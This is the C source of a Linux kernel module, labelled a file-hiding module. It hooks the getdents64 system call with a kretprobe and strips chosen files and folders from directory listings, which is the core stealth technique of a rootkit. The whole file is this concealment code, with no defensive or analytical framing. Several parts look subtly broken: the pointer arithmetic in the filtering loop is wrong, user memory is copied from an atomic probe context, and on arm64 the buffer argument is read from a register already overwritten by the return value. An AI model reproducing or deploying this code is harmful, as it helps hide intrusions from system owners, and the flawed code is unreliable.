/*
 * hook_manager.c - Hook core manager
 * File hiding module - 使用 kprobe 方式（更安全）
 */

#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/ptrace.h>

#include "hook.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("HOOK");
MODULE_DESCRIPTION("File Hiding Module");
MODULE_VERSION("1.0");

/* Hidden file/folder storage */
static struct hidden_entry hidden_files[MAX_HIDDEN_FILES];
static int hidden_count;
static DEFINE_SPINLOCK(hidden_lock);

/* Symbol resolver via kprobe */
static void *(*kallsyms_lookup_name_fn)(const char *name);

static int kallsyms_kp_pre(struct kprobe *p, struct pt_regs *regs)
{
	return 0;
}

static struct kprobe kp_kallsyms = {
	.symbol_name = "kallsyms_lookup_name",
	.pre_handler = kallsyms_kp_pre,
};

/* 获取符号地址 */
static int init_symbol_resolver(void)
{
	int ret;

	ret = register_kprobe(&kp_kallsyms);
	if (ret < 0) {
		pr_err("hook: failed to register kallsyms kprobe: %d\n", ret);
		return ret;
	}

	kallsyms_lookup_name_fn = (void *)kp_kallsyms.addr;
	pr_info("hook: kallsyms_lookup_name = %px\n", kallsyms_lookup_name_fn);

	unregister_kprobe(&kp_kallsyms);
	return 0;
}

/* Getdents64 syscall number */
#ifndef __NR_getdents64
#define __NR_getdents64 61
#endif

int add_hidden_file(const char *name, bool is_dir)
{
	unsigned long flags;
	int i;

	if (!name || strlen(name) >= sizeof(hidden_files[0].name))
		return -EINVAL;

	spin_lock_irqsave(&hidden_lock, flags);

	for (i = 0; i < hidden_count; i++) {
		if (hidden_files[i].active &&
		    strcmp(hidden_files[i].name, name) == 0 &&
		    hidden_files[i].is_dir == is_dir) {
			spin_unlock_irqrestore(&hidden_lock, flags);
			return -EEXIST;
		}
	}

	if (hidden_count >= MAX_HIDDEN_FILES) {
		spin_unlock_irqrestore(&hidden_lock, flags);
		return -ENOSPC;
	}

	strcpy(hidden_files[hidden_count].name, name);
	hidden_files[hidden_count].is_dir = is_dir;
	hidden_files[hidden_count].active = true;
	hidden_count++;

	spin_unlock_irqrestore(&hidden_lock, flags);
	pr_info("hook: added hidden %s: %s\n", is_dir ? "dir" : "file", name);
	return 0;
}

int remove_hidden_file(const char *name)
{
	unsigned long flags;
	int i;

	spin_lock_irqsave(&hidden_lock, flags);

	for (i = 0; i < hidden_count; i++) {
		if (hidden_files[i].active &&
		    strcmp(hidden_files[i].name, name) == 0) {
			hidden_files[i].active = false;
			spin_unlock_irqrestore(&hidden_lock, flags);
			pr_info("hook: removed hidden: %s\n", name);
			return 0;
		}
	}

	spin_unlock_irqrestore(&hidden_lock, flags);
	return -ENOENT;
}

bool is_hidden(const char *name, bool is_dir)
{
	unsigned long flags;
	bool found = false;
	int i;

	if (!name)
		return false;

	spin_lock_irqsave(&hidden_lock, flags);

	for (i = 0; i < hidden_count; i++) {
		if (hidden_files[i].active &&
		    hidden_files[i].is_dir == is_dir &&
		    strcmp(hidden_files[i].name, name) == 0) {
			found = true;
			break;
		}
	}

	spin_unlock_irqrestore(&hidden_lock, flags);
	return found;
}

void clear_hidden_list(void)
{
	unsigned long flags;
	int i;

	spin_lock_irqsave(&hidden_lock, flags);

	for (i = 0; i < hidden_count; i++)
		hidden_files[i].active = false;
	hidden_count = 0;

	spin_unlock_irqrestore(&hidden_lock, flags);
	pr_info("hook: hidden list cleared\n");
}

/* Directory entry structure */
struct linux_dirent64 {
	u64 d_ino;
	s64 d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[256];
};

/* Kprobe for sys_getdents64 - 使用 return handler */
static struct kprobe kp_getdents64;

static int hidden_entries_count;

/* Return handler - 在 syscall 返回后过滤结果 */
static int getdents64_rp_pre(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	/* nothing to do pre-return */
	return 0;
}

static int getdents64_rp_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	long ret;
	struct linux_dirent64 __user *dirent;
	struct linux_dirent64 *kbuf = NULL;
	struct linux_dirent64 *curr, *prev;
	int count, new_count;
	char name[256];

	/* 获取返回值 - x0 for arm64 */
#ifdef __aarch64__
	ret = regs->regs[0];
	dirent = (struct linux_dirent64 __user *)regs->regs[1];
#else
	ret = regs->ax;
	dirent = (struct linux_dirent64 __user *)regs->di;
#endif

	if (ret <= 0)
		return 0;

	count = (int)ret;
	hidden_entries_count = 0;

	/* 分配临时缓冲区 */
	kbuf = kmalloc(count + 256, GFP_ATOMIC);
	if (!kbuf)
		return 0;

	/* 复制用户空间数据 */
	if (copy_from_user(kbuf, dirent, count)) {
		kfree(kbuf);
		return 0;
	}

	/* 过滤隐藏的条目 */
	curr = kbuf;
	prev = NULL;
	new_count = count;

	while (curr < kbuf + count) {
		unsigned short reclen = curr->d_reclen;

		if (reclen == 0)
			break;

		memset(name, 0, sizeof(name));
		strncpy(name, curr->d_name, sizeof(name) - 1);

		if (is_hidden(name, curr->d_type == DT_DIR)) {
			new_count -= reclen;
			hidden_entries_count++;
			if (prev)
				prev->d_off = curr->d_off;
		} else {
			prev = curr;
		}

		curr = (struct linux_dirent64 *)((char *)curr + reclen);
	}

	/* 如果有隐藏的条目，更新结果 */
	if (new_count < count && new_count > 0) {
		if (!copy_to_user(dirent, kbuf, new_count)) {
#ifdef __aarch64__
			regs->regs[0] = new_count;
#else
			regs->ax = new_count;
#endif
		}
	}

	kfree(kbuf);
	return 0;
}

static struct kretprobe rp_getdents64 = {
	.symbol_name = "__x64_sys_getdents64",
	.entry_handler = getdents64_rp_pre,
	.handler = getdents64_rp_handler,
	.data_size = 0,
	.maxactive = 4,
};

/* External vfs hook functions */
extern int vfs_hook_init(void);
extern void vfs_hook_exit(void);

static bool kprobe_registered;

static int __init hook_init(void)
{
	int ret;

	pr_info("hook: initializing...\n");

	/* 初始化符号解析器 */
	ret = init_symbol_resolver();
	if (ret < 0) {
		pr_err("hook: failed to init symbol resolver: %d\n", ret);
		return ret;
	}

	/* 注册 kretprobe */
	ret = register_kretprobe(&rp_getdents64);
	if (ret < 0) {
		pr_err("hook: failed to register getdents64 kretprobe: %d\n", ret);
		return ret;
	}
	kprobe_registered = true;
	pr_info("hook: getdents64 kretprobe registered at %px\n", rp_getdents64.kp.addr);

	ret = vfs_hook_init();
	if (ret < 0)
		pr_warn("hook: vfs_hook_init failed: %d\n", ret);

	pr_info("hook: module initialized\n");
	return 0;
}

static void __exit hook_exit(void)
{
	if (kprobe_registered) {
		unregister_kretprobe(&rp_getdents64);
		synchronize_rcu();
		pr_info("hook: kretprobe unregistered, hidden %d entries\n", hidden_entries_count);
	}

	vfs_hook_exit();
	clear_hidden_list();
	pr_info("hook: module exited\n");
}

module_init(hook_init);
module_exit(hook_exit);
